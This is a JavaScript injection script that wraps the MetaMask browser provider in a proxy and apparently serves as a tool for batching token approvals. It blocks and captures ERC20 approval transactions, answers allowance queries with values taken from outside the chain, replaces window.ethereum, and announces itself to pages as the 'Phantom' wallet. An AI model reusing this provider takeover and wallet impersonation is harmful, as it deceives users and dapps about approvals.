(() => {
  if (window.__mmPassthroughInjected) return;
  window.__mmPassthroughInjected = true;

  const currentScript = document.currentScript;
  const enabledAttr = currentScript && currentScript.dataset
    ? currentScript.dataset.passthroughEnabled
    : null;
  const initialEnabled = enabledAttr === null ? true : enabledAttr === "1";

  const getMetaMask = () => {
    const eth = window.ethereum;
    if (!eth) return null;
    // MetaMask sets isMetaMask; if not present, still allow passthrough
    return eth;
  };

  const isErc20ApproveData = (data) => {
    if (!data || typeof data !== "string") return false;
    return data.toLowerCase().startsWith("0x095ea7b3");
  };

  const isErc20AllowanceData = (data) => {
    if (!data || typeof data !== "string") return false;
    return data.toLowerCase().startsWith("0xdd62ed3e");
  };

  const decodeAddressParam = (data, index) => {
    if (!data || typeof data !== "string") return null;
    const hex = data.startsWith("0x") ? data.slice(2) : data;
    const start = 8 + index * 64;
    if (hex.length < start + 64) return null;
    const word = hex.slice(start, start + 64);
    return `0x${word.slice(24)}`;
  };

  const decodeUint256Param = (data, index) => {
    if (!data || typeof data !== "string") return null;
    const hex = data.startsWith("0x") ? data.slice(2) : data;
    const start = 8 + index * 64;
    if (hex.length < start + 64) return null;
    const word = hex.slice(start, start + 64);
    return `0x${word}`;
  };

  const detectApproval = (payload) => {
    if (!payload || payload.method !== "eth_sendTransaction") return;
    const params = Array.isArray(payload.params) ? payload.params : [];
    const tx = params[0];
    if (tx && isErc20ApproveData(tx.data)) {
      const spender = decodeAddressParam(tx.data, 0);
      const amount = decodeUint256Param(tx.data, 1);
      try {
        console.log("MetaMask Passthrough Wallet: detected ERC20 approval", {
          token: tx.to,
          owner: tx.from,
          spender,
          amount,
          tx
        });
      } catch (_) {}
      try {
        window.postMessage(
          {
            source: "mm-passthrough",
            type: "MM_PASSTHROUGH_APPROVAL",
            tx,
            parsed: {
              token: tx.to || null,
              owner: tx.from || null,
              spender,
              amount
            }
          },
          "*"
        );
      } catch (_) {}
      return true;
    }
    return false;
  };

  const pendingAllowanceRequests = new Map();

  const requestAllowanceMatch = ({ token, owner, spender }) =>
    new Promise((resolve) => {
      const requestId = `allowance-${Date.now()}-${Math.random().toString(16).slice(2)}`;
      const timeout = setTimeout(() => {
        pendingAllowanceRequests.delete(requestId);
        resolve(null);
      }, 1500);

      pendingAllowanceRequests.set(requestId, { resolve, timeout });
      window.postMessage(
        {
          source: "mm-passthrough",
          type: "MM_PASSTHROUGH_ALLOWANCE_QUERY",
          requestId,
          token: token || null,
          owner: owner || null,
          spender: spender || null
        },
        "*"
      );
    });

  const detectAllowanceMatch = (payload) => {
    if (!payload || payload.method !== "eth_call") return null;
    const params = Array.isArray(payload.params) ? payload.params : [];
    const call = params[0];
    if (!call) return null;

    if (isErc20AllowanceData(call.data)) {
      const owner = decodeAddressParam(call.data, 0);
      const spender = decodeAddressParam(call.data, 1);
      return requestAllowanceMatch({
        token: call.to || null,
        owner,
        spender
      });
    }

    return null;
  };

  const createPassthrough = (target) => {
    const handler = {
      get(obj, prop) {
        if (prop === "isPassthroughWallet") return true;
        if (prop === "isMetaMask") return false;
        if (prop === "_passthroughTarget") return obj;

        const value = obj[prop];
        if (typeof value === "function") {
          return (...args) => {
            try {
              console.log("MetaMask Passthrough Wallet: forwarding call", String(prop), args);
            } catch (_) {}
            try {
              if (prop === "request" && args && args[0]) {
                const shouldBlock = detectApproval(args[0]);
                if (shouldBlock) {
                  return Promise.reject(
                    new Error("Approval blocked: captured for batching")
                  );
                }
                const matchPromise = detectAllowanceMatch(args[0]);
                if (matchPromise) {
                  return matchPromise.then((match) => {
                    if (match && match.amount) return match.amount;
                    return value.apply(obj, args);
                  });
                }
                return value.apply(obj, args);
              }
            } catch (_) {}
            return value.apply(obj, args);
          };
        }
        return value;
      },
      set(obj, prop, value) {
        obj[prop] = value;
        return true;
      }
    };

    return new Proxy(target, handler);
  };

  const mm = getMetaMask();
  if (!mm) {
    console.warn("MetaMask Passthrough Wallet: MetaMask provider not found");
    return;
  }

  const passthrough = createPassthrough(mm);

  // Expose a dedicated passthrough provider.
  window.passthroughEthereum = passthrough;

  const originalEthereum = window.ethereum;
  const originalWeb3 = window.web3;
  const originalWeb3Provider = originalWeb3 ? originalWeb3.currentProvider : undefined;

  const applyOverride = (enabled) => {
    if (enabled) {
      window.ethereum = passthrough;
      if (!window.web3) {
        window.web3 = { currentProvider: passthrough };
      } else {
        window.web3.currentProvider = passthrough;
      }
      return;
    }

    if (originalEthereum === undefined) {
      try {
        delete window.ethereum;
      } catch (_) {
        window.ethereum = undefined;
      }
    } else {
      window.ethereum = originalEthereum;
    }

    if (originalWeb3 === undefined) {
      try {
        delete window.web3;
      } catch (_) {
        window.web3 = undefined;
      }
    } else {
      window.web3 = originalWeb3;
      if (originalWeb3Provider !== undefined) {
        window.web3.currentProvider = originalWeb3Provider;
      }
    }
  };

  applyOverride(initialEnabled);

  const respondAddress = async (requestId) => {
    let address = null;
    try {
      if (passthrough.selectedAddress) {
        address = passthrough.selectedAddress;
      } else if (passthrough.request) {
        const accounts = await passthrough.request({ method: "eth_accounts" });
        if (Array.isArray(accounts) && accounts.length) {
          address = accounts[0];
        }
      }
    } catch (_) {}

    window.postMessage(
      {
        source: "mm-passthrough",
        type: "MM_PASSTHROUGH_ADDRESS_RESPONSE",
        requestId,
        address
      },
      "*"
    );
  };

  window.addEventListener("message", (event) => {
    if (event.source !== window || !event.data) return;
    if (event.data.source !== "mm-passthrough") return;
    if (event.data.type !== "MM_PASSTHROUGH_GET_ADDRESS") return;
    respondAddress(event.data.requestId);
  });

  window.addEventListener("message", (event) => {
    if (event.source !== window || !event.data) return;
    if (event.data.source !== "mm-passthrough") return;
    if (event.data.type !== "MM_PASSTHROUGH_SET_ENABLED") return;
    applyOverride(Boolean(event.data.enabled));
  });

  // EIP-6963 provider discovery hook.
  const getStableUuid = () => {
    const key = "__mm_passthrough_uuid";
    try {
      const existing = window.localStorage && window.localStorage.getItem(key);
      if (existing) return existing;
      const created = (typeof crypto !== "undefined" && crypto.randomUUID)
        ? crypto.randomUUID()
        : `mm-passthrough-${Date.now()}-${Math.random().toString(16).slice(2)}`;
      window.localStorage && window.localStorage.setItem(key, created);
      return created;
    } catch (_) {
      return (typeof crypto !== "undefined" && crypto.randomUUID)
        ? crypto.randomUUID()
        : `mm-passthrough-${Date.now()}-${Math.random().toString(16).slice(2)}`;
    }
  };

  const providerInfo = {
    uuid: getStableUuid(),
    name: "Phantom",
    // Inline SVG icon (data URL). Some UIs require a non-empty icon.
    icon:
      "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHZpZXdCb3g9IjAgMCA2NCA2NCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHJ4PSIxMiIgZmlsbD0iI0UyRUFGOSIvPjxyZWN0IHg9IjE0IiB5PSIyMCIgd2lkdGg9IjM2IiBoZWlnaHQ9IjI0IiByeD0iNiIgZmlsbD0iIzFGN0FFMCIvPjxjaXJjbGUgY3g9IjIyIiBjeT0iMzIiIHI9IjQiIGZpbGw9IiNGRkYiLz48Y2lyY2xlIGN4PSIzMiIgY3k9IjMyIiByPSI0IiBmaWxsPSIjRkZGIi8+PGNpcmNsZSBjeD0iNDIiIGN5PSIzMiIgcj0iNCIgZmlsbD0iI0ZGRiIvPjwvc3ZnPg==",
    rdns: "app.phantom"
  };

  const announceProvider = () => {
    window.dispatchEvent(
      new CustomEvent("eip6963:announceProvider", {
        detail: {
          info: providerInfo,
          provider: passthrough
        }
      })
    );
  };

  window.addEventListener("eip6963:requestProvider", announceProvider);
  announceProvider();

  window.addEventListener("message", (event) => {
    if (event.source !== window || !event.data) return;
    if (event.data.source !== "mm-passthrough") return;
    if (event.data.type !== "MM_PASSTHROUGH_ALLOWANCE_MATCH") return;
    if (event.data.requestId && pendingAllowanceRequests.has(event.data.requestId)) {
      const pending = pendingAllowanceRequests.get(event.data.requestId);
      if (pending) {
        clearTimeout(pending.timeout);
        pendingAllowanceRequests.delete(event.data.requestId);
        pending.resolve(event.data.approval || null);
      }
    }
    try {
      console.log("MetaMask Passthrough Wallet: allowance matches captured approval", event.data.approval);
    } catch (_) {}
  });
})();
